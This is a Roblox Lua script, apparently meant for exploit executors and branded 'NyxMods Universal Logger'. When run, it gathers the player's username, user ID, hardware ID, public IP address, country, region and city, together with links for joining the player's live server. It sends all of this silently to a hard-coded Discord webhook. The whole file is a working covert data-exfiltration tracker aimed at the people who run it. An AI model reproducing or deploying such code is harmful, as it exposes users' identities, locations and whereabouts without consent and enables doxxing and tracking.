local HttpService = game:GetService("HttpService")
local MarketPlaceService = game:GetService("MarketplaceService")
local webhook_url = "https://discord.com/api/webhooks/1545328189260173422/W90DFCUgLtuLy38fT-Zu39FFnNthovmHcYF4mp-B7dzHiZlBSHVwinz0bZdyled2W-JU"

local Countries = {
    ["AF"] = "🇦🇫 Afganistán",
    ["AL"] = "🇦🇱 Albania",
    ["DE"] = "🇩🇪 Alemania",
    ["AD"] = "🇦🇩 Andorra",
    ["AO"] = "🇦🇴 Angola",
    ["AG"] = "🇦🇬 Antigua y Barbuda",
    ["SA"] = "🇸🇦 Arabia Saudita",
    ["DZ"] = "🇩🇿 Argelia",
    ["AR"] = "🇦🇷 Argentina",
    ["AM"] = "🇦🇲 Armenia",
    ["AU"] = "🇦🇺 Australia",
    ["AT"] = "🇦🇹 Austria",
    ["AZ"] = "🇦🇿 Azerbaiyán",
    ["BS"] = "🇧🇸 Bahamas",
    ["BH"] = "🇧🇭 Baréin",
    ["BD"] = "🇧🇩 Bangladés",
    ["BB"] = "🇧🇧 Barbados",
    ["BE"] = "🇧🇪 Bélgica",
    ["BZ"] = "🇧🇿 Belice",
    ["BJ"] = "🇧🇯 Benín",
    ["BY"] = "🇧🇾 Bielorrusia",
    ["BO"] = "🇧🇴 Bolivia",
    ["BA"] = "🇧🇦 Bosnia y Herzegovina",
    ["BW"] = "🇧🇼 Botsuana",
    ["BR"] = "🇧🇷 Brasil",
    ["BN"] = "🇧🇳 Brunéi",
    ["BG"] = "🇧🇬 Bulgaria",
    ["BF"] = "🇧🇫 Burkina Faso",
    ["BI"] = "🇧🇮 Burundi",
    ["BT"] = "🇧🇹 Bután",
    ["CV"] = "🇨🇻 Cabo Verde",
    ["KH"] = "🇰🇭 Camboya",
    ["CM"] = "🇨🇲 Camerún",
    ["CA"] = "🇨🇦 Canadá",
    ["QA"] = "🇶🇦 Catar",
    ["TD"] = "🇹🇩 Chad",
    ["CL"] = "🇨🇱 Chile",
    ["CN"] = "🇨🇳 China",
    ["CY"] = "🇨🇾 Chipre",
    ["CO"] = "🇨🇴 Colombia",
    ["KM"] = "🇰🇲 Comoras",
    ["CG"] = "🇨🇬 Congo",
    ["CD"] = "🇨🇩 República Democrática del Congo",
    ["KR"] = "🇰🇷 Corea del Sur",
    ["KP"] = "🇰🇵 Corea del Norte",
    ["CR"] = "🇨🇷 Costa Rica",
    ["CI"] = "🇨🇮 Costa de Marfil",
    ["HR"] = "🇭🇷 Croacia",
    ["CU"] = "🇨🇺 Cuba",
    ["DK"] = "🇩🇰 Dinamarca",
    ["DM"] = "🇩🇲 Dominica",
    ["EC"] = "🇪🇨 Ecuador",
    ["EG"] = "🇪🇬 Egipto",
    ["SV"] = "🇸🇻 El Salvador",
    ["AE"] = "🇦🇪 Emiratos Árabes Unidos",
    ["ER"] = "🇪🇷 Eritrea",
    ["SK"] = "🇸🇰 Eslovaquia",
    ["SI"] = "🇸🇮 Eslovenia",
    ["ES"] = "🇪🇸 España",
    ["US"] = "🇺🇸 Estados Unidos",
    ["EE"] = "🇪🇪 Estonia",
    ["SZ"] = "🇸🇿 Esuatini",
    ["ET"] = "🇪🇹 Etiopía",
    ["FJ"] = "🇫🇯 Fiyi",
    ["PH"] = "🇵🇭 Filipinas",
    ["FI"] = "🇫🇮 Finlandia",
    ["FR"] = "🇫🇷 Francia",
    ["GA"] = "🇬🇦 Gabón",
    ["GM"] = "🇬🇲 Gambia",
    ["GE"] = "🇬🇪 Georgia",
    ["GH"] = "🇬🇭 Ghana",
    ["GD"] = "🇬🇩 Granada",
    ["GR"] = "🇬🇷 Grecia",
    ["GT"] = "🇬🇹 Guatemala",
    ["GN"] = "🇬🇳 Guinea",
    ["GQ"] = "🇬🇶 Guinea Ecuatorial",
    ["GW"] = "🇬🇼 Guinea-Bisáu",
    ["GY"] = "🇬🇾 Guyana",
    ["HT"] = "🇭🇹 Haití",
    ["HN"] = "🇭🇳 Honduras",
    ["HU"] = "🇭🇺 Hungría",
    ["IN"] = "🇮🇳 India",
    ["ID"] = "🇮🇩 Indonesia",
    ["IQ"] = "🇮🇶 Irak",
    ["IR"] = "🇮🇷 Irán",
    ["IE"] = "🇮🇪 Irlanda",
    ["IS"] = "🇮🇸 Islandia",
    ["IL"] = "🇮🇱 Israel",
    ["IT"] = "🇮🇹 Italia",
    ["JM"] = "🇯🇲 Jamaica",
    ["JP"] = "🇯🇵 Japón",
    ["JO"] = "🇯🇴 Jordania",
    ["KZ"] = "🇰🇿 Kazajistán",
    ["KE"] = "🇰🇪 Kenia",
    ["KG"] = "🇰🇬 Kirguistán",
    ["KI"] = "🇰🇮 Kiribati",
    ["KW"] = "🇰🇼 Kuwait",
    ["LA"] = "🇱🇦 Laos",
    ["LV"] = "🇱🇻 Letonia",
    ["LB"] = "🇱🇧 Líbano",
    ["LR"] = "🇱🇷 Liberia",
    ["LY"] = "🇱🇾 Libia",
    ["LI"] = "🇱🇮 Liechtenstein",
    ["LT"] = "🇱🇹 Lituania",
    ["LU"] = "🇱🇺 Luxemburgo",
    ["MG"] = "🇲🇬 Madagascar",
    ["MY"] = "🇲🇾 Malasia",
    ["MW"] = "🇲🇼 Malaui",
    ["MV"] = "🇲🇻 Maldivas",
    ["ML"] = "🇲🇱 Malí",
    ["MT"] = "🇲🇹 Malta",
    ["MA"] = "🇲🇦 Marruecos",
    ["MU"] = "🇲🇺 Mauricio",
    ["MR"] = "🇲🇷 Mauritania",
    ["MX"] = "🇲🇽 México",
    ["MD"] = "🇲🇩 Moldavia",
    ["MC"] = "🇲🇨 Mónaco",
    ["MN"] = "🇲🇳 Mongolia",
    ["ME"] = "🇲🇪 Montenegro",
    ["MZ"] = "🇲🇿 Mozambique",
    ["MM"] = "🇲🇲 Myanmar",
    ["NA"] = "🇳🇦 Namibia",
    ["NR"] = "🇳🇷 Nauru",
    ["NP"] = "🇳🇵 Nepal",
    ["NI"] = "🇳🇮 Nicaragua",
    ["NE"] = "🇳🇪 Níger",
    ["NG"] = "🇳🇬 Nigeria",
    ["NO"] = "🇳🇴 Noruega",
    ["NZ"] = "🇳🇿 Nueva Zelanda",
    ["OM"] = "🇴🇲 Omán",
    ["NL"] = "🇳🇱 Países Bajos",
    ["PK"] = "🇵🇰 Pakistán",
    ["PW"] = "🇵🇼 Palaos",
    ["PA"] = "🇵🇦 Panamá",
    ["PG"] = "🇵🇬 Papúa Nueva Guinea",
    ["PY"] = "🇵🇾 Paraguay",
    ["PE"] = "🇵🇪 Perú",
    ["PL"] = "🇵🇱 Polonia",
    ["PT"] = "🇵🇹 Portugal",
    ["DO"] = "🇩🇴 República Dominicana",
    ["RO"] = "🇷🇴 Rumanía",
    ["RU"] = "🇷🇺 Rusia",
    ["RW"] = "🇷🇼 Ruanda",
    ["KN"] = "🇰🇳 San Cristóbal y Nieves",
    ["LC"] = "🇱🇨 Santa Lucía",
    ["VC"] = "🇻🇨 San Vicente y las Granadinas",
    ["WS"] = "🇼🇸 Samoa",
    ["SM"] = "🇸🇲 San Marino",
    ["ST"] = "🇸🇹 Santo Tomé y Príncipe",
    ["SN"] = "🇸🇳 Senegal",
    ["RS"] = "🇷🇸 Serbia",
    ["SC"] = "🇸🇨 Seychelles",
    ["SL"] = "🇸🇱 Sierra Leona",
    ["SG"] = "🇸🇬 Singapur",
    ["SY"] = "🇸🇾 Siria",
    ["SO"] = "🇸🇴 Somalia",
    ["LK"] = "🇱🇰 Sri Lanka",
    ["ZA"] = "🇿🇦 Sudáfrica",
    ["SD"] = "🇸🇩 Sudán",
    ["SS"] = "🇸🇸 Sudán del Sur",
    ["SE"] = "🇸🇪 Suecia",
    ["CH"] = "🇨🇭 Suiza",
    ["SR"] = "🇸🇷 Surinam",
    ["TH"] = "🇹🇭 Tailandia",
    ["TW"] = "🇹🇼 Taiwán",
    ["TZ"] = "🇹🇿 Tanzania",
    ["TJ"] = "🇹🇯 Tayikistán",
    ["TL"] = "🇹🇱 Timor Oriental",
    ["TG"] = "🇹🇬 Togo",
    ["TO"] = "🇹🇴 Tonga",
    ["TT"] = "🇹🇹 Trinidad y Tobago",
    ["TN"] = "🇹🇳 Túnez",
    ["TM"] = "🇹🇲 Turkmenistán",
    ["TR"] = "🇹🇷 Turquía",
    ["TV"] = "🇹🇻 Tuvalu",
    ["UA"] = "🇺🇦 Ucrania",
    ["UG"] = "🇺🇬 Uganda",
    ["UY"] = "🇺🇾 Uruguay",
    ["UZ"] = "🇺🇿 Uzbekistán",
    ["VU"] = "🇻🇺 Vanuatu",
    ["VA"] = "🇻🇦 Ciudad del Vaticano",
    ["VE"] = "🇻🇪 Venezuela",
    ["VN"] = "🇻🇳 Vietnam",
    ["YE"] = "🇾🇪 Yemen",
    ["ZM"] = "🇿🇲 Zambia",
    ["ZW"] = "🇿🇼 Zimbabue",
}


local function SendLog(Title,Description,Fields,AvatarImageLink)
    local Req = (syn and syn.request) or http_request or request or (http and http.request)

    if not Req then return end

Req({
    Url = webhook_url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        username = "NyxMods Universal Logger",
        embeds = {{
            title = Title,
            description = Description,

            fields = Fields,

            footer = {
                text = "NyxMods Universal • Logs"
            },
            
            image = {
                url = AvatarImageLink
            },

            timestamp = DateTime.now():ToIsoDate()
        }}
    })
})
end

local function GetHwid()
    local Hwid = gethwid and gethwid() or get_hwid and get_hwid()
    if Hwid then
        return Hwid
    else
        local Client = game.Players.LocalPlayer
        if Client then
            local Name = Client.Name
            local UserId = Client.UserId

            return UserId..Name
        end
    end
end

local function GetPublicIp()
    local Req = (syn and syn.request) or http_request or request or (http and http.request)

    if not Req then return "Unknow" end

    local response = Req({
        Url = "https://ipinfo.io/json",
        Method = "GET"
    })

    local data = HttpService:JSONDecode(response.Body)

    return data.ip
end

local function GetCountry()
    local Req = (syn and syn.request) or http_request or request or (http and http.request)

    if not Req then return "Unknow" end

    local response = Req({
        Url = "https://ipinfo.io/json",
        Method = "GET"
    })

    local data = HttpService:JSONDecode(response.Body)

    return data.country
end

local function GetCity()
    local Req = (syn and syn.request) or http_request or request or (http and http.request)

    if not Req then return "Unknow" end

    local response = Req({
        Url = "https://ipinfo.io/json",
        Method = "GET"
    })

    local data = HttpService:JSONDecode(response.Body)

    return data.city
end

local function GetRegion()
    local Req = (syn and syn.request) or http_request or request or (http and http.request)

    if not Req then return "Unknow" end

    local response = Req({
        Url = "https://ipinfo.io/json",
        Method = "GET"
    })

    local data = HttpService:JSONDecode(response.Body)

    return data.region
end

local function GetAvatarImageLink()
    local UserId = game:GetService("Players").LocalPlayer.UserId
    
    local JSONUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. UserId .. "&size=420x420&format=Png&isCircular=false"
    
    local Req = (syn and syn.request) or http_request or request or (http and http.request)
    
    if not Req then return "Unknow" end
    
    local Response = Req({
        Url = JSONUrl,
        Method = "GET",
    })

if Response.Success then
    local Data = HttpService:JSONDecode(Response.Body)
    local ImageUrl = Data.data[1].imageUrl
    
    return ImageUrl
end

return "Unknow"
end

local function GetData(Type)
    local Players = game:GetService("Players")
    if Players then
        local Client = Players.LocalPlayer

        if Type == "Name" then
            return Client.Name
        elseif Type == "DisplayName" then
            return Client.DisplayName
        elseif Type == "UserId" then
            return Client.UserId
        elseif Type == "Hwid" then
            return GetHwid()
        elseif Type == "Ip" then
            return GetPublicIp()
        elseif Type == "PlaceId" then
            return game.PlaceId
        elseif Type == "JobId" then
            return game.JobId
        elseif Type == "Game Name" then
            local Info = MarketPlaceService:GetProductInfo(game.PlaceId)
            local Name = Info.Name

            return Name
        elseif Type == "Link" then
            local PlaceId = game.PlaceId
            local JobId = game.JobId

            local Link = "roblox://experiences/start?placeId="..PlaceId.."&gameInstanceId="..JobId

            return Link
        elseif Type == "Mobile Link" then
            local PlaceId = game.PlaceId
            local JobId = game.JobId

            local Link = "https://www.roblox.com/games/start?placeId=" .. PlaceId .. "&gameInstanceId=" .. JobId


            return Link
        elseif Type == "Country" then
            local Country = GetCountry()

            if Countries[Country] then
                return Countries[Country]
            else
                return Country
            end
        elseif Type == "Region" then
            return GetRegion()
        elseif Type == "City" then
            return GetCity()
        elseif Type == "AvatarImageLink" then
            return GetAvatarImageLink()
        end

    end
end

local Name = GetData("Name")
local DisplayName = GetData("DisplayName")
local UserId = GetData("UserId")
local Hwid = GetData("Hwid")
local Ip = GetData("Ip")
local PlaceId = GetData("PlaceId")
local JobId = GetData("JobId")
local GameName = GetData("Game Name")
local Link = GetData("Link")
local MobileLink = GetData("Mobile Link")
local Country = GetData("Country")
local Region = GetData("Region")
local City = GetData("City")
local AvatarImageLink = GetData("AvatarImageLink")

local Fields = {
    {
        name = "👤 User",
        value = "```" .. Name .. "```",
        inline = true
    },

    {
        name = "✨ Display Name",
        value = "```" .. DisplayName .. "```",
        inline = true
    },

    {
        name = "🆔 UserId",
        value = "```" .. UserId .. "```",
        inline = true
    },

    {
        name = "🔐 Hwid",
        value = "```" .. Hwid .. "```",
        inline = true
    },

    {
        name = "🌐 IP",
        value = "```" .. Ip .. "```",
        inline = true
    },

    {
        name = "🌎 Country",
        value = "```" .. Country .. "```",
        inline = true
    },

    {
        name = "📍 Region",
        value = "```" .. Region .. "```",
        inline = true
    },

    {
        name = "🏙️ City",
        value = "```" .. City .. "```",
        inline = true
    },

    {
        name = "🎮 Game",
        value = "```" .. GameName .. "```",
        inline = false
    },

    {
        name = "🆔 PlaceId",
        value = "```" .. PlaceId .. "```",
        inline = true
    },

    {
        name = "🖥️ JobId",
        value = "```" .. JobId .. "```",
        inline = false
    },

    {
        name = "🔗 Server Link (PC)",
        value = "```" .. Link .. "```",
        inline = false
    },

    {
        name = "🔗 Server Link (Mobile)",
        value = "```" .. MobileLink .. "```",
        inline = false
    }
}

SendLog("✦ NyxMods Universal • Activity","A new NyxMods execution has been detected.",Fields,AvatarImageLink)